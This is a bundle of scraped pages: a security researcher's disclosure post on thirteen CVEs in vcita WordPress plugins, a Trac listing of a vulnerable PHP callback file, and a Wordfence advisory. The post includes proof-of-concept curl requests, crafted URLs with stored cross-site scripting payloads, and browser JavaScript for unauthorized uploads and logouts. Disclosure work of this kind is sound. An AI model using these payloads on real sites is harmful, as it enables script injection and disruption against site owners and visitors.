=== Content from blog.jonh.eu_7d6401d3_20250115_092735.html ===


[Jonas' Blog](https://blog.jonh.eu)

# Security Vulnerabilities in WordPress Plugins by vcita

On 02/02/2023 I discovered several security vulnerabilities in the WordPress plugins by vcita and reached out to the company according to responsible disclosure principles. The company issued updates to fix the vulnerabilities on June 12.

The following CVEs have been assigned to the security vulnerabilities:

1. **[CVE-2023-2298](https://www.cve.org/CVERecord?id=CVE-2023-2298)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Unauthenticated Stored Cross-Site Scripting

2. **[CVE-2023-2299](https://www.cve.org/CVERecord?id=CVE-2023-2299)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization on REST-API

3. **[CVE-2023-2300](https://www.cve.org/CVERecord?id=CVE-2023-2300)** – Contact Form Builder by vcita <= 4.9.1 – Authenticated (Contributor+) Stored Cross-Site Scripting

4. **[CVE-2023-2301](https://www.cve.org/CVERecord?id=CVE-2023-2301)** – Contact Form Builder by vcita <= 4.9.1 – Cross-Site Request Forgery to Stored Cross-Site Scripting

5. **[CVE-2023-2302](https://www.cve.org/CVERecord?id=CVE-2023-2302)** – Contact Form and Calls To Action by vcita <= 2.6.4 – Authenticated (Contributor+) Stored Cross-Site Scripting

6. **[CVE-2023-2303](https://www.cve.org/CVERecord?id=CVE-2023-2303)** – Contact Form and Calls To Action by vcita <= 2.6.4 – Cross-Site Request Forgery to Stored Cross-Site Scripting

7. **[CVE-2023-2404](https://www.cve.org/CVERecord?id=CVE-2023-2404)** – CRM and Lead Management by vcita <= 2.6.2 – Authenticated (Contributor+) Stored Cross-Site Scripting

8. **[CVE-2023-2405](https://www.cve.org/CVERecord?id=CVE-2023-2405)** – CRM and Lead Management by vcita <= 2.6.2 – Cross-Site Request Forgery to Stored Cross-Site Scripting

9. **[CVE-2023-2406](https://www.cve.org/CVERecord?id=CVE-2023-2406)** – Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 – Authenticated (Contributor+) Stored Cross-Site Scripting

10. **[CVE-2023-2407](https://www.cve.org/CVERecord?id=CVE-2023-2407)** – Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 – Cross-Site Request Forgery to Stored Cross-Site Scripting

11. **[CVE-2023-2414](https://www.cve.org/CVERecord?id=CVE-2023-2414)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization to Settings Update and Media Upload

12. **[CVE-2023-2415](https://www.cve.org/CVERecord?id=CVE-2023-2415)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization to Account Logout

13. **[CVE-2023-2416](https://www.cve.org/CVERecord?id=CVE-2023-2416)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Cross-Site Request Forgery to Account Logout

**Online Booking & Scheduling Calendar for WordPress by vcita (4.1 – 4.2.10)**Stored Cross Site Scripting, Missing Authentication
3000+ active installs, ~ 400.000 downloads
The plugin uses an unprotected REST route endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Attacker sends the following curl request to a website that uses the vcita widget. The request updates the `uid` & `business\_id` & `business\_name` & `email` variables in the database:
   “`curl
   curl –request POST \
   –url <https://example.com/wp-json/vcita-wordpress/v1/actions/auth> \
   –header ‘Content-Type: application/json’ \
   –data ‘{
       “success”: true,
       “user\_data”: {
           “business\_id”: “\”; alert(1); //”,
           “business\_name”: “Evil Eve”,
           “email”: [“[email protected]”](/cdn-cgi/l/email-protection#6b0e1d0e2b0e1d020745080406)
       }
   }’
   “`
2. The injected alert(1) is executed on the live website

**Contact Form Builder by vcita (<= 4.9.1)**
2000+ active installs, ~ 360.000 downloads
The plugin does not validate $\_GET parameters and stores them directly in the database. These values are later inserted into the page without sanitation. This endpoint also does not have sufficient access control since all users with the edit\_posts capability can open it.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: [example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL
2. The email field `a”/><script>alert(1);</script>` is stored in the database
3. When an admin opens the plugin’s settings page (`wp-admin/admin.php?page=live-site`) the alert is triggered.

**Contact Form and Calls To Action by vcita (<= 2.6.4)**
400+ active installs, ~ 135.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`

Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**CRM and Lead Management by vcita (<= 2.6.2)**
400+ active installs, ~ 40.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**CRM and Lead Management by vcita (<= 2.6.2)**
400+ active installs, ~ 40.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`

Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above

2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**Event Registration Calendar By vcita (<= 1.3.1)**
100+ active installs, ~ 25.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered.

**Online Payments – Get Paid with PayPal, Square & Stripe (<= 3.9.1)**
300+ active installs, ~ 50.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The email field `a”/><script>alert(1);</script>` is stored in the database
3. When an admin opens the plugin’s settings page (`wp-admin/admin.php?page=live-site`) the alert is triggered (vcita has to be connected) In Case B if an admin opens the link the site will redirect directly to the infected page.

**Online Booking & Scheduling Calendar for WordPress by vcita (<= 4.2.10)**
3000+ active installs, ~ 400.000 downloadsThis privilege escalation allows any logged-in user (subscriber level is sufficient) to upload an arbitrary number of files to the Media Library.

Proof of Concept
1. Attacker registers on the website.
2. Attacker adds a new input field in his browser: `<input type=”file” name=”my\_files[]”>` and selects an image file (vcita\_save\_settings\_callback does check for allowed mime types)
3. Attacker opens the browser’s developer tools and runs the following JavaScript:
       const input = document.querySelector(‘input[type=”file”]’);
       const file = input.files[0];
       const formData = new FormData();
       formData.append(“widget\_img”, file);
       const xhr = new XMLHttpRequest();
       xhr.open(
         “POST”,
[“https://example.com/wp-admin/admin-ajax.php?action=vcita\_save\_settings”](https://example.com/wp-admin/admin-ajax.php?action=vcita_save_settings),
         true
       );
       xhr.send(formData);
    4. Image is now uploaded to the website.

**Online Booking & Scheduling Calendar for WordPress by vcita (<= 4.2.10)**
3000+ active installs, ~ 400.000 downloadsThis privilege escalation allows a logged-in user (subscriber level is sufficient) to log the administrator out of the vcita account. As a result, website visitors will not be able to make appointments and the owner of the website may lose a considerable amount of revenue.
Another attack vector would be to use Cross-Site Request Forgery (CSRF) to manipulate any logged in user to perform the logout.

Proof of Concept
1. Attacker registers on the website.
2. Attacker opens the browser’s developer tools and runs the following JavaScript:
   fetch(“/wp-admin/admin-ajax.php?action=vcita\_logout”, {
     method: “POST”,
     headers: {
       Accept: “\*/\*”,
       “Content-Type”: “application/json”,
     },
   });
   Alternative: manipulate any logged in user to send a POST request to the server.
3. Website connection with vcita account is deactivated.

Do you want to reach out?

[Contact](https://blog.jonh.eu/contact)

---

---

Posted

2. June 2023

in

[Allgemein](https://blog.jonh.eu/blog/category/allgemein)

by

jonas

Tags:

[Jonas' Blog](https://blog.jonh.eu)

[Imprint](https://blog.jonh.eu/imprint) | [Privacy](https://blog.jonh.eu/privacy)



=== Content from plugins.trac.wordpress.org_939ea4cc_20250115_092747.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fevent-registration-calendar-by-vcita%2Ftrunk%2Fsystem%2Fparse_vcita_callback.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php?rev=1357114 "Revision 1357114")
* Next Revision →
* [Blame](/browser/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php)

---

# [source:](/browser?order=name "Go to repository root") [event-registration-calendar-by-vcita](/browser/event-registration-calendar-by-vcita?order=name "View event-registration-calendar-by-vcita")/[trunk](/browser/event-registration-calendar-by-vcita/trunk?order=name "View trunk")/[system](/browser/event-registration-calendar-by-vcita/trunk/system?order=name "View system")/[parse\_vcita\_callback.php](/browser/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php?order=name "View parse_vcita_callback.php")

View diff against:

View revision:

| [Last change](/changeset/2924420/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php "View differences") on this file was [2924420](/changeset/2924420/ "View changeset 2924420"), checked in by vCita, [19 months ago](/timeline?from=2023-06-11T11%3A28%3A26Z&precision=second "See timeline at 06/11/2023 11:28:26 AM") |
| --- |
| 1.4.0 |
| * Property **svn:executable** set to   *`*`* | |
| **File size:** 2.7 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\* |
| [3](#L3) | \*  livesite\_parse\_callback |
| [4](#L4) | \* |
| [5](#L5) | \*  @description: Parses the return callback once the user logged in to vCita |
| [6](#L6) | \*  @since: 3.6 |
| [7](#L7) | \*  @created: 25/01/13 |
| [8](#L8) | \*/ |
| [9](#L9) |  |
| [10](#L10) | class livesite\_parse\_callback |
| [11](#L11) | { |
| [12](#L12) |  |
| [13](#L13) | /\*\* |
| [14](#L14) | \* Sets up helpers as global |
| [15](#L15) | \* @since 0.1.1 |
| [16](#L16) | \*/ |
| [17](#L17) | public $ls\_helpers; |
| [18](#L18) |  |
| [19](#L19) | /\* |
| [20](#L20) | \*  \_\_construct |
| [21](#L21) | \* |
| [22](#L22) | \*  @description: |
| [23](#L23) | \*  @since 3.1.8 |
| [24](#L24) | \*  @created: 23/06/12 |
| [25](#L25) | \*/ |
| [26](#L26) |  |
| [27](#L27) | function \_\_construct(){ |
| [28](#L28) |  |
| [29](#L29) | $this->ls\_helpers = new ls\_helpers(); |
| [30](#L30) |  |
| [31](#L31) | // Uses priority 20 to laod after plugin init |
| [32](#L32) | add\_action( 'admin\_menu', array($this, 'add\_parse\_vcita\_callback\_page'), 20 ); |
| [33](#L33) |  |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | /\*\* |
| [37](#L37) | \* Adds a hidden page to allow reseting the plugin (mainly used for degbugging but not exclusive) |
| [38](#L38) | \* @since 0.1.0 |
| [39](#L39) | \*/ |
| [40](#L40) | function add\_parse\_vcita\_callback\_page(){ |
| [41](#L41) | add\_submenu\_page( |
| [42](#L42) | null, |
| [43](#L43) | \_\_('', 'livesite'), |
| [44](#L44) | \_\_('', 'livesite'), |
| [45](#L45) | 'edit\_posts', |
| [46](#L46) | 'live-site-parse-vcita-callback', |
| [47](#L47) | array($this, 'ls\_parse\_vcita\_callback') |
| [48](#L48) | ); |
| [49](#L49) | } |
| [50](#L50) |  |
| [51](#L51) | /\*\* |
| [52](#L52) | \* Parses the return values from vcita connection |
| [53](#L53) | \* @since 0.1.0 |
| [54](#L54) | \*/ |
| [55](#L55) | function ls\_parse\_vcita\_callback(){ |
| [56](#L56) |  |
| [57](#L57) | $success = $\_GET['success']; |
| [58](#L58) | $uid = $\_GET['uid']; |
| [59](#L59) | $first\_name = $\_GET['first\_name']; |
| [60](#L60) | $last\_name = $\_GET['last\_name']; |
| [61](#L61) | $title = $\_GET['title']; |
| [62](#L62) | $confirmation\_token = $\_GET['confirmation\_token']; |
| [63](#L63) | $confirmed = $\_GET['confirmed']; |
| [64](#L64) | $engage\_delay = $\_GET['engage\_delay']; |
| [65](#L65) | $implementation\_key = $\_GET['implementation\_key']; |
| [66](#L66) | $email = $\_GET['email']; |
| [67](#L67) |  |
| [68](#L68) | ls\_set\_settings( array( |
| [69](#L69) | 'vcita\_connected' => true, |
| [70](#L70) | 'vcita\_params' => array( |
| [71](#L71) | 'success'              => $success, |
| [72](#L72) | 'uid'                  => htmlspecialchars($uid), |
| [73](#L73) | 'first\_name'           => htmlspecialchars($first\_name), |
| [74](#L74) | 'last\_name'            => htmlspecialchars($last\_name), |
| [75](#L75) | 'title'                => htmlspecialchars($title), |
| [76](#L76) | 'confirmation\_token'   => htmlspecialchars($confirmation\_token), |
| [77](#L77) | 'confirmed'            => filter\_var($confirmed, FILTER\_SANITIZE\_ENCODED), |
| [78](#L78) | 'engage\_delay'         => htmlspecialchars($engage\_delay), |
| [79](#L79) | 'implementation\_key'   => htmlspecialchars($implementation\_key), |
| [80](#L80) | 'email'                => filter\_var($email, FILTER\_SANITIZE\_EMAIL) |
| [81](#L81) | ) |
| [82](#L82) | )); |
| [83](#L83) |  |
| [84](#L84) | $ls\_helpers = $this->ls\_helpers; |
| [85](#L85) |  |
| [86](#L86) | // Replace curly brace tags inside of html code |
| [87](#L87) | // $ls\_helpers->ls\_replace\_default\_tags(); |
| [88](#L88) |  |
| [89](#L89) | $redirect\_url = $ls\_helpers->get\_plugin\_path(); |
| [90](#L90) |  |
| [91](#L91) | ?> |
| [92](#L92) | <script type="text/javascript"> |
| [93](#L93) | window.location = "<?php echo $redirect\_url; ?>"; |
| [94](#L94) | </script> |
| [95](#L95) | <?php } |
| [96](#L96) |  |
| [97](#L97) | } |
| [98](#L98) |  |
| [99](#L99) | new livesite\_parse\_callback(); |
| [100](#L100) |  |
| [101](#L101) | ?> |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php?format=txt)
* [Original Format](/export/3222718/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.wordfence.com_eeef268e_20250115_092750.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 - Cross-Site Request Forgery to Stored Cross-Site Scripting

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 - Cross-Site Request Forgery to Stored Cross-Site Scripting

6.1

**Cross-Site Request Forgery (CSRF)**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

| CVE | [CVE-2023-2407](https://www.cve.org/CVERecord?id=CVE-2023-2407) |
| --- | --- |
| CVSS | 6.1 (Medium) |
| Publicly Published | June 2, 2023 |
| Last Updated | January 22, 2024 |
| Researcher | [Jonas Höbenreich](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/jonas-hobenreich) |

### Description

The Event Registration Calendar By vcita plugin, versions up to and including 3.9.1, and Online Payments – Get Paid with PayPal, Square & Stripe plugin, for WordPress are vulnerable to Cross-Site Request Forgery. This is due to missing nonce validation in the ls\_parse\_vcita\_callback() function. This makes it possible for unauthenticated attackers to modify the plugin's settings and inject malicious JavaScript via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/event-registration-calendar-by-vcita/trunk/system/parse_vcita_callback.php#L55)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/paypal-payment-button-by-vcita/trunk/system/parse_vcita_callback.php)
* [blog.jonh.eu](https://blog.jonh.eu/blog/security-vulnerabilities-in-wordpress-plugins-by-vcita)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fdetail%2Fevent-registration-calendar-by-vcita-131-online-payments-get-paid-with-paypal-square-stripe-391-cross-site-request-forgery-to-stored-cross-site-scripting&t=Event%20Registration%20Calendar%20By%20vcita%20%3C%3D%201.3.1%20%26%20Online%20Payments%20%E2%80%93%20Get%20Paid%20with%20PayPal%2C%20Square%20%26%20Stripe%20%3C%3D%203.9.1%20-%20Cross-Site%20Request%20Forgery%20to%20Stored%20Cross-Site%20Scripting "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fdetail%2Fevent-registration-calendar-by-vcita-131-online-payments-get-paid-with-paypal-square-stripe-391-cross-site-request-forgery-to-stored-cross-site-scripting&text=Event%20Registration%20Calendar%20By%20vcita%20%3C%3D%201.3.1%20%26%20Online%20Payments%20%E2%80%93%20Get%20Paid%20with%20PayPal%2C%20Square%20%26%20Stripe%20%3C%3D%203.9.1%20-%20Cross-Site%20Request%20Forgery%20to%20Stored%20Cross-Site%20Scripting "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fdetail%2Fevent-registration-calendar-by-vcita-131-online-payments-get-paid-with-paypal-square-stripe-391-cross-site-request-forgery-to-stored-cross-site-scripting "LinkedIn")
Email

## 2 affected software packages

#### [Event Registration Calendar By vcita](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/event-registration-calendar-by-vcita)

| Software Type | Plugin |
| --- | --- |
| Software Slug | event-registration-calendar-by-vcita [(view on wordpress.org)](https://wordpress.org/plugins/event-registration-calendar-by-vcita) |
| Patched? | No |
| Remediation | No known patch available. Please review the vulnerability's details in depth and employ mitigations based on your organization's risk tolerance. It may be best to uninstall the affected software and find a replacement. |
| Affected Version | * <= 1.3.1 |

#### [Online Payments – Get Paid with PayPal, Square & Stripe](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/paypal-payment-button-by-vcita)

| Software Type | Plugin |
| --- | --- |
| Software Slug | paypal-payment-button-by-vcita [(view on wordpress.org)](https://wordpress.org/plugins/paypal-payment-button-by-vcita) |
| Patched? | No |
| Remediation | No known patch available. Please review the vulnerability's details in depth and employ mitigations based on your organization's risk tolerance. It may be best to uninstall the affected software and find a replacement. |
| Affected Version | * <= 3.9.1 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_f2950294_20250115_092749.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fpaypal-payment-button-by-vcita%2Ftrunk%2Fsystem%2Fparse_vcita_callback.php)

* [Timeline](/timeline)
